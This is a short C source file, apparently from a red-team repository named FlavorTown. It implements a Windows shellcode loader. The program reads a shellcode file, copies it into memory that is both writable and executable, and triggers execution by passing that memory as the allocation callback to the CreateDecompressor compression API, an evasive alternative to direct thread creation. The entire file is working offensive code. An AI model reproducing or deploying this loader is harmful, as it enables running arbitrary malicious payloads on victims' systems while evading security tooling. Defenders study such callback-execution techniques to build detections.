// Wra7h/FlavorTown
// Minimum Supported Client: Windows 8
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Cabinet.lib")

#include <stdio.h>
#include <windows.h>
#include <compressapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	DECOMPRESSOR_HANDLE hDecompressor = NULL;
	
	if (argc != 2)
	{
		printf("Usage: CreateDecompressor.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	COMPRESS_ALLOCATION_ROUTINES SCAR = { 0 };
	SCAR.Allocate = hAlloc;
	SCAR.Free = hAlloc;
	SCAR.UserContext = NULL;

	CreateDecompressor(COMPRESS_ALGORITHM_MSZIP, &SCAR, &hDecompressor);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hDecompressor)
		CloseDecompressor(hDecompressor);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}